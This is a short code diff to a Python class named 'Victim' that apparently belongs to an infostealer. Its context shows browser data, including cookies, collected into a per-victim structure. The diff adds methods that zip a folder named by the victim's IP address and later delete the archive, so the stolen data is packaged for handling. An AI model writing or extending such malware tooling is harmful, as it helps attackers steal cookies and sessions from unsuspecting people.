@@ -2,6 +2,7 @@
 import os
 import json
 import sqlite3
+import shutil
 
 
 class Victim():
@@ -160,3 +161,15 @@ class Victim():
                 FullBrowsersData["COOKIES"].append(data)
 
         return FullBrowsersData
+
+    def ZipVictimFolder(self) -> str:
+        """
+        Zips a victim folder.
+        return:
+            (str): the name of the zip folder.
+        """
+        shutil.make_archive(self.ip, 'zip', self.ip)
+        return self.ip + ".zip"
+    
+    def RemoveVictimZip(self) -> None:
+        os.remove(self.ip + ".zip")
